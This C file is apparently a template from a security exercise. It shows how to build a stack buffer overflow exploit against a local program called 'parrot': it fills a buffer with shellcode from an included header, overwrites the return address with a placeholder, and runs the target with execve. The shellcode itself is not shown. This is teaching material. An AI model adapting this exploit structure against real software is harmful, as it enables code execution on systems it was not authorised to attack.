/*
 * This template demonstrates how an exploit for a stack based
 * buffer overflow could be structured. Feel free to use it, or
 * write your own from scratch.
 *
 * The code does NOT match parrot; it is just a template and you need to change
 * most of it.
 */

#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned char shellcode[] = {
#include "shellcode.h"
};

int main(void)
{
  struct _overflow {
    char buf[117];      /* buffer that we overflow */
    uint32_t ret;       /* return address */
    unsigned char nul;  /* terminate string */
  } __attribute__((packed)) overflow;
  char *argv[] = { "./parrot", (char *)&overflow, NULL };

  memset(&overflow, 'A', sizeof(overflow));

  /* place the shellcode in the beginning of the buffer */
  memcpy(overflow.buf, shellcode, sizeof(shellcode));

  /* return to a CALL EDX in vulnerable program */
  overflow.ret = 0x41414141;

  /* terminate the string */
  overflow.nul = '\0';

  execve(argv[0], argv, NULL);

  return EXIT_FAILURE;
}
